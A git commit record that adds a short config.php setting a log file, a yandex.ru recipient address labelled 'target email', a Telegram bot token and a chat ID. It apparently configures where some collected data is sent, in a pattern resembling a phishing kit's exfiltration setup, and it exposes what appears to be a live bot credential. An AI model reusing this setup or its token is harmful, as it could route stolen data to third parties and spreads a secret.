6c8451fc25ec5bc0cd2d09135f4de24efeac0dfd
successfulbolo-pixel <successfulbolo@gmail.com>
2026-04-10 11:06:33 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,5 @@
+<?php
+$logFile = "logs.txt";
+$emailTo = "zhu.zhung@yandex.ru"; // Replace with your target email
+$teltok = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk";
+$telchatid = "1357995456";
